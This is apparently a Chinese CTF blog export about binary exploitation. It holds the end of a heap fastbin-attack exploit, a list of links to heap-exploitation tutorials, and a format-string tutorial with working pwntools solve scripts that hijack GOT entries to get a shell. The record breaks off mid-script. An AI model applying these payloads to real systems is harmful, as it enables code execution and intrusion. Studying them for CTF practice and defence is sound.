p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'(y/n)?\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(un_addr)</span>    <span class="token keyword">return</span> un_addrun_addr <span class="token operator">=</span> leak_libc<span class="token punctuation">(</span><span class="token punctuation">)</span>arena_addr <span class="token operator">=</span> un_addr <span class="token operator">-</span> <span class="token number">88</span>libc_addr <span class="token operator">=</span> un_addr <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> offset_Dindex_sen<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x5e</span> <span class="token operator">+</span> <span class="token string">' d'</span><span class="token punctuation">)</span>index_sen<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x5e</span> <span class="token operator">+</span> <span class="token string">' d'</span><span class="token punctuation">)</span>index_sen<span class="token punctuation">(</span><span class="token string">'c'</span><span class="token operator">*</span><span class="token number">0x5e</span> <span class="token operator">+</span> <span class="token string">' d'</span><span class="token punctuation">)</span>search_word<span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'(y/n)?\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'(y/n)?\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'(y/n)?\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>search_word<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'(y/n)?\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'(y/n)?\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'(y/n)?\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span>fake_addr <span class="token operator">=</span> arena_addr <span class="token operator">-</span> <span class="token number">0x33</span>fake_chunk <span class="token operator">=</span> p64<span class="token punctuation">(</span>fake_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">)</span>index_sen<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span>index_sen<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">)</span>index_sen<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">)</span>one_gad <span class="token operator">=</span> libc_addr <span class="token operator">+</span> <span class="token number">0xf1147</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gad<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">)</span>index_sen<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路见ctfwiki：</p><p><a href="https://wiki.x10sec.org/pwn/heap/fastbin_attack/#2015-9447-ctf-search-engine" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/fastbin_attack/#2015-9447-ctf-search-engine</a></p><h1 id="堆漏洞挖掘（CSDN博客）"><a href="#堆漏洞挖掘（CSDN博客）" class="headerlink" title="堆漏洞挖掘（CSDN博客）"></a>堆漏洞挖掘（CSDN博客）</h1><h3 id="01——堆简介"><a href="#01——堆简介" class="headerlink" title="01——堆简介"></a>01——堆简介</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/96846067" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/96846067</a></p><h3 id="02——堆的glibc实现与Arena"><a href="#02——堆的glibc实现与Arena" class="headerlink" title="02——堆的glibc实现与Arena"></a>02——堆的glibc实现与Arena</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/96847761" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/96847761</a></p><h3 id="03——chunk分类"><a href="#03——chunk分类" class="headerlink" title="03——chunk分类"></a>03——chunk分类</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/96851282" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/96851282</a></p><h3 id="04——bins分类"><a href="#04——bins分类" class="headerlink" title="04——bins分类"></a>04——bins分类</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/96865321" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/96865321</a></p><h3 id="05——堆的调用流程与相关概念"><a href="#05——堆的调用流程与相关概念" class="headerlink" title="05——堆的调用流程与相关概念"></a>05——堆的调用流程与相关概念</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/96876286" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/96876286</a></p><h3 id="06——struct-malloc-chunk结构体"><a href="#06——struct-malloc-chunk结构体" class="headerlink" title="06——struct malloc_chunk结构体"></a>06——struct malloc_chunk结构体</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/97135257" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/97135257</a></p><h3 id="07——chunk的NON-MAIN-ARENA、IS-MAPPED、PREV-INUSE位"><a href="#07——chunk的NON-MAIN-ARENA、IS-MAPPED、PREV-INUSE位" class="headerlink" title="07——chunk的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位"></a>07——chunk的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/97135163" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/97135163</a></p><h3 id="08——chunk的mchunk-prev-size成员的空间复用"><a href="#08——chunk的mchunk-prev-size成员的空间复用" class="headerlink" title="08——chunk的mchunk_prev_size成员的空间复用"></a>08——chunk的mchunk_prev_size成员的空间复用</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/97158973" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/97158973</a></p><h3 id="09——chunk的实际大小、最低大小、-mchunk-size成员"><a href="#09——chunk的实际大小、最低大小、-mchunk-size成员" class="headerlink" title="09——chunk的实际大小、最低大小、 mchunk_size成员"></a>09——chunk的实际大小、最低大小、 mchunk_size成员</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/97611079" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/97611079</a></p><h3 id="10——bins的单向链表、双向链表存储结构"><a href="#10——bins的单向链表、双向链表存储结构" class="headerlink" title="10——bins的单向链表、双向链表存储结构"></a>10——bins的单向链表、双向链表存储结构</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/97613588" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/97613588</a></p><h3 id="11——top-chunk的向前合并"><a href="#11——top-chunk的向前合并" class="headerlink" title="11——top chunk的向前合并"></a>11——top chunk的向前合并</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/97617470" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/97617470</a></p><h3 id="12——chunk的malloc、free"><a href="#12——chunk的malloc、free" class="headerlink" title="12——chunk的malloc、free"></a>12——chunk的malloc、free</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/97619181" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/97619181</a></p><h3 id="13——malloc-consolidate与FASTBIN-CONSOLIDATION-THRESHOLD"><a href="#13——malloc-consolidate与FASTBIN-CONSOLIDATION-THRESHOLD" class="headerlink" title="13——malloc_consolidate与FASTBIN_CONSOLIDATION_THRESHOLD"></a>13——malloc_consolidate与FASTBIN_CONSOLIDATION_THRESHOLD</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/97627411" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/97627411</a></p><h3 id="14—多线程中的堆内存结构"><a href="#14—多线程中的堆内存结构" class="headerlink" title="14—多线程中的堆内存结构"></a>14—多线程中的堆内存结构</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/97645903" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/97645903</a></p><h3 id="15——fastbins的大小（DEFAULT-MXFAST、MAX-FAST-SIZE）"><a href="#15——fastbins的大小（DEFAULT-MXFAST、MAX-FAST-SIZE）" class="headerlink" title="15——fastbins的大小（DEFAULT_MXFAST、MAX_FAST_SIZE）"></a>15——fastbins的大小（DEFAULT_MXFAST、MAX_FAST_SIZE）</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/97748333" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/97748333</a></p><h3 id="16——malloc一个chunk的检测机制"><a href="#16——malloc一个chunk的检测机制" class="headerlink" title="16——malloc一个chunk的检测机制"></a>16——malloc一个chunk的检测机制</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/97753705" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/97753705</a></p><h3 id="17——last-remainder"><a href="#17——last-remainder" class="headerlink" title="17——last remainder"></a>17——last remainder</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/97803141" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/97803141</a></p><h3 id="18——堆块的unlink"><a href="#18——堆块的unlink" class="headerlink" title="18——堆块的unlink"></a>18——堆块的unlink</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/98850842" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/98850842</a></p><h3 id="19——-lib-malloc函数源码详解"><a href="#19——-lib-malloc函数源码详解" class="headerlink" title="19——_lib_malloc函数源码详解"></a>19——_lib_malloc函数源码详解</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/99048619" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99048619</a></p><h3 id="20——-int-malloc函数源码详解"><a href="#20——-int-malloc函数源码详解" class="headerlink" title="20——_int_malloc函数源码详解"></a>20——_int_malloc函数源码详解</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/99005759" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99005759</a></p><h3 id="21——-lib-free函数源码详解"><a href="#21——-lib-free函数源码详解" class="headerlink" title="21——_lib_free函数源码详解"></a>21——_lib_free函数源码详解</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/99071778" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99071778</a></p><h3 id="22——set-inuse-bit-at-offset"><a href="#22——set-inuse-bit-at-offset" class="headerlink" title="22——set_inuse_bit_at_offset"></a>22——set_inuse_bit_at_offset</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/99053867" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99053867</a> （暂无）</p><h3 id="23——The-malloc-maleficarum"><a href="#23——The-malloc-maleficarum" class="headerlink" title="23——The malloc maleficarum"></a>23——The malloc maleficarum</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/99175217" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99175217</a></p><h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><p><a href="https://www.cnblogs.com/gm-201705/p/9901548.html" target="_blank" rel="noopener">https://www.cnblogs.com/gm-201705/p/9901548.html</a></p><h3 id="24——The-malloc-maleficarum之The-House-of-Force漏洞"><a href="#24——The-malloc-maleficarum之The-House-of-Force漏洞" class="headerlink" title="24——The malloc maleficarum之The House of Force漏洞"></a>24——The malloc maleficarum之The House of Force漏洞</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/99175608" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99175608</a></p><p><a href="https://bbs.pediy.com/thread-222924.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222924.htm</a></p><p>以上两篇使用了同一个例子，有一个疑问：为什么是-4120？</p><p>第二篇甚至给出了具体的计算过程：</p><p>0x601020-0x602020-0x10=-4120</p><p>然而实际上计算结果是-4112，为什么会相差8呢？</p><h3 id="25——The-malloc-maleficarum之The-House-of-Spirit漏洞"><a href="#25——The-malloc-maleficarum之The-House-of-Spirit漏洞" class="headerlink" title="25——The malloc maleficarum之The House of Spirit漏洞"></a>25——The malloc maleficarum之The House of Spirit漏洞</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/99175665" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99175665</a></p><h3 id="26——unlink漏洞"><a href="#26——unlink漏洞" class="headerlink" title="26——unlink漏洞"></a>26——unlink漏洞</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/99291378" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99291378</a> （暂无）</p><h3 id="27——fastbin-attack漏洞"><a href="#27——fastbin-attack漏洞" class="headerlink" title="27——fastbin attack漏洞"></a>27——fastbin attack漏洞</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/99315504" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99315504</a></p><h3 id="28——fastbin-attack漏洞之-malloc-hook攻击"><a href="#28——fastbin-attack漏洞之-malloc-hook攻击" class="headerlink" title="28——fastbin attack漏洞之__malloc_hook攻击"></a>28——fastbin attack漏洞之__malloc_hook攻击</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/99321101" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99321101</a></p><h3 id="29——unsortedbin-attack漏洞"><a href="#29——unsortedbin-attack漏洞" class="headerlink" title="29——unsortedbin attack漏洞"></a>29——unsortedbin attack漏洞</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/99329694" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99329694</a></p><h3 id="House-of系列"><a href="#House-of系列" class="headerlink" title="House of系列"></a>House of系列</h3><p><a href="https://paper.seebug.org/521/#house-of-force" target="_blank" rel="noopener">https://paper.seebug.org/521/#house-of-force</a></p><h3 id="alarm函数"><a href="#alarm函数" class="headerlink" title="alarm函数"></a>alarm函数</h3><p><a href="https://www.cnblogs.com/wuyepeng/p/9788919.html" target="_blank" rel="noopener">https://www.cnblogs.com/wuyepeng/p/9788919.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> 链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串</title>
      <link href="/2020/01/17/ge-shi-hua-zi-fu-chuan/"/>
      <url>/2020/01/17/ge-shi-hua-zi-fu-chuan/</url>
      
        <content type="html"><![CDATA[<h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><p><strong>参考网页：</strong></p><p><a href="https://blog.csdn.net/qq_43394612/article/details/84900668" target="_blank" rel="noopener">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/9329387.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/9329387.html</a></p><ul><li>正常情况：printf(“%s”,buf);</li><li>格式化漏洞：printf(buf);</li><li>分32位和64位，比赛中常见32位</li><li>可以造成任意地址读(AAR)和任意地址写(AAW)</li><li>其实是第一个参数对后续参数的解析工作，当第一个参数被我们所控制的时候，解析工作就会出现一定的问题</li><li>%p %s都可以产生漏洞，推荐%p，不会出问题</li></ul><p>%x 输出16进制数，前面没有0x</p><p>%p 输出16进制数，前面有0x</p><p>例：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>如果输入”%x,%x,%x”</li><li>因为printf函数并不知道参数个数，会根据特定类型的%去取相应参数的值，直到检索到格式化字符串结束</li><li>所以尽管没有参数，上面的代码也会将format string后面的内存当作参数以16进制输出，这样就会造成内存泄漏</li></ul><h3 id="任意内存读取"><a href="#任意内存读取" class="headerlink" title="任意内存读取"></a>任意内存读取</h3><ul><li>%s对应的参量是一个指向字符串首地址的指针，作用是输出这个字符串</li><li>局部变量存储在栈中，所以一定可以找到我们输入的格式化字符串（只要有足够多的%x）</li><li><code>%&lt;number&gt;$x</code>是直接读取第number个位置的参数（Linux下才有用），例如%7$x是读取第7个参数</li><li>不仅是%x，同样可以用在%n %d等中</li></ul><p><strong>实现过程：</strong></p><ol><li>找到输入所在的位置，即栈偏移（因为第一个参数就是格式化字符串自身，栈偏移为0，所以第n个参数栈偏移为n-1）</li><li>将想要泄漏的地址写到字符串开头，注意写法：地址0x08048001写成”\x01\x80\x04\x08”</li><li>再接着输入”%(n-1)$s”即可完成任意内存读取</li></ol><h3 id="任意内存写入"><a href="#任意内存写入" class="headerlink" title="任意内存写入"></a>任意内存写入</h3><p>%n的功能是计算前面打印出来的字符个数，将其赋值给对应变量（或对应位置），可利用%c填充</p><p><strong>例：</strong></p><pre class="line-numbers language-python"><code class="language-python">io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"\x8c\x97\x04\x08%2048c%5$n"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中”\x8c\x97\x04\x08”正好在第六个参数处</p><p>运行结果是：0x0804978c 处的值变为0x804（即2048+4）</p><p><strong>找到printf_got和system_plt，将got表中的printf项劫持为system的plt表项：</strong></p><pre class="line-numbers language-python"><code class="language-python">payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>system_plt<span class="token number">-4</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%5$n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>问题是要输出大量空字符导致时间过长</p><p>解决方法：使用%hhn</p><table><thead><tr><th>格式化字符串</th><th>对应字节数</th></tr></thead><tbody><tr><td>%lln</td><td>8字节</td></tr><tr><td>%n</td><td>4字节</td></tr><tr><td>%hn</td><td>2字节</td></tr><tr><td>%hhn</td><td>1字节</td></tr></tbody></table><pre class="line-numbers language-python"><code class="language-python">printf_got <span class="token operator">=</span> <span class="token number">0x08049778</span>system_plt <span class="token operator">=</span> <span class="token number">0x08048320</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%5$hhn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x83</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%6$hhn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x104</span><span class="token operator">-</span><span class="token number">0x83</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%7$hhn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x08</span><span class="token operator">-</span><span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%8$hhn'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pwntools中提供了一个可以直接使用的类fmtstr</p><pre class="line-numbers language-python"><code class="language-python">fmtstr_payload<span class="token punctuation">(</span>offset<span class="token punctuation">,</span><span class="token punctuation">{</span>address<span class="token punctuation">:</span>data<span class="token punctuation">}</span><span class="token punctuation">,</span>numbwritten<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">'byte'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>offset</td><td>栈偏移，本例中是第6个参数，所以栈偏移是5</td></tr><tr><td>{address:data}</td><td>地址和数据</td></tr><tr><td>numbwritten</td><td>printf在格式化字符串之前输出的数据长度</td></tr><tr><td>write_size</td><td>%hhn—-byte; %hn—-word; %n—-dword</td></tr></tbody></table><p><strong>注意：</strong></p><ul><li>‘\x00’是终止符，而64位下用户可见内存地址高位都带有’\x00’，因此我们需要调整一下payload，将地址放到最后</li><li>同时还要注意地址前的数据恰好为地址长度的整数倍</li></ul><pre class="line-numbers language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'a%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>system_plt<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%6$lln'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><strong>0x06 angstromctf 2016-format1</strong></p><ul><li>程序read和printf之后进行判断，若secret=192执行giveshell</li><li>找到栈偏移为8</li><li>找到secret地址为0x60107c</li><li>构造payload，因为地址高位有’\x00’，所以要把地址放到最后</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./format1'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'aaaa%188c%10$lln'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x60107c</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io.sendline('aaaa..%x.%x.%x.%x.%x.%x.%x.%x.%x.%x')</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>0x06 format_x86</strong></p><ul><li>程序循环进行read和printf，可以将printf劫持到system处</li><li>栈偏移为5</li><li>IDA左边的函数窗口可以看到plt地址，双击可以看到got地址</li><li>构造payload，可以使用fmtstr_payload</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./format_x86'</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token number">5</span>printf_got <span class="token operator">=</span> <span class="token number">0x08049778</span>system_plt <span class="token operator">=</span> <span class="token number">0x08048320</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">{</span>printf_got<span class="token punctuation">:</span>system_plt<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(payload)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>0x06 format_x86-64</strong></p><ul><li>上一题的64位版，地址放到最后</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./format_x86-64'</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token number">6</span>sys_plt <span class="token operator">=</span> <span class="token number">0x400460</span>pri_got <span class="token operator">=</span> <span class="token number">0x601020</span>payload <span class="token operator">=</span> <span class="token string">'a'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>sys_plt<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%8$lln'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pri_got<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x06-greeting"><a href="#0x06-greeting" class="headerlink" title="0x06 greeting"></a>0x06 greeting</h3><ul><li>程序没有循环，在printf之后立刻结束，没有调用其他函数</li><li>程序结束会调用fini_array中的函数指针</li><li>把fini_array中的第一项指针覆盖为start地址，可以重新运行</li><li>在前面有printf(“Please tell me your name…”); 所以不能覆盖printf_got</li><li>在getnline函数中有strlen(s)，可以将strlen_got覆盖为system_plt</li><li>构造payload，注意s是在输入前面加上”Nice to meet you , “ 所以要注意前面的字符数，必要时补几个字符来对齐</li><li>start只用覆盖后4位，因为前4位是一致的</li></ul><table><thead><tr><th>总共需要4个地址</th><th></th></tr></thead><tbody><tr><td>fini_array</td><td>Ctrl+s 查看段或打开Segments窗口</td></tr><tr><td>start</td><td>左侧函数窗口直接查看</td></tr><tr><td>strlen_got</td><td>在左侧函数窗口双击进入，jmp后面的地址</td></tr><tr><td>system_plt</td><td>左侧函数窗口直接查看</td></tr></tbody></table><p>start 覆盖 fini_array</p><p>system_plt 覆盖 strlen_got</p><p><strong>sprintf函数</strong></p><p>除去第一个参数，就与printf完全相同</p><p>不输出到屏幕，而是输出到第一个参数</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./greeting'</span><span class="token punctuation">)</span>fini_array <span class="token operator">=</span> <span class="token number">0x08049934</span>start <span class="token operator">=</span> <span class="token number">0x080484f0</span>strlen_got <span class="token operator">=</span> <span class="token number">0x08049a54</span>system_plt <span class="token operator">=</span> <span class="token number">0x08048490</span><span class="token comment" spellcheck="true">#print('111\n')</span>payload <span class="token operator">=</span> <span 